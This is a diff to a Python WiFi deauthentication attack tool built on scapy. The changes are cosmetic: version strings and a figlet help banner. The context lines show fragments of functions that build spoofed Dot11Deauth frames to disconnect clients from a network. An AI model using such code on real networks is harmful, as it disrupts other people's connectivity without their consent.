@@ -2,6 +2,10 @@
 
 # Author: Slax38
 
+# New Version v0.6.2 --> Design improvement
+
+# Version v0.6.2
+
 from scapy.all import *
 import os, time, re, subprocess, getopt
 import random
@@ -23,7 +27,7 @@ menu()
 def deauthattack(interface, bssid, deauth_count):
    global stop_capture
    print()
-   print("WiFiDeauther v0.6.2 WiFi Deauth Attack Tool, Slax38")
+   print("WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38")
    print()
    print("[+] Capturing beacon from", bssid)
    def sniff_callback(packet):
@@ -52,7 +56,7 @@ signal.signal(signal.SIGINT, signal_handler)
 
 def deauthclient(interface, bssid, client, deauth_count):
     global stop_capture
-    print("WiFiDeauther v0.6.2 WiFi Deauth Attack Tool, Slax38")
+    print("WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38")
     print("[+] Capturing beacon from", bssid)
     dot11 = Dot11(addr1=client, addr2=bssid, addr3=bssid)
     rsn = Dot11Deauth(reason=7)
@@ -64,8 +68,10 @@ def deauthclient(interface, bssid, client, deauth_count):
     print("[+] Deauth attack finished.")
 
 def helpPanel():
-    print("WiFiDeauther 2023 v0.6.2 WiFi Deauth Attack Tool, Slax38")
+    os.system("figlet WiFiDeauther")
+    print("------------------------------------------------------------------")
     print()
+    print("WiFiDeauther v0.6.3 WiFi Deauth Attack Tool, Slax38")
     print("Arguments:")
     print("-help, --helpPanel")
     print("-i, --interface=<wlan0>")
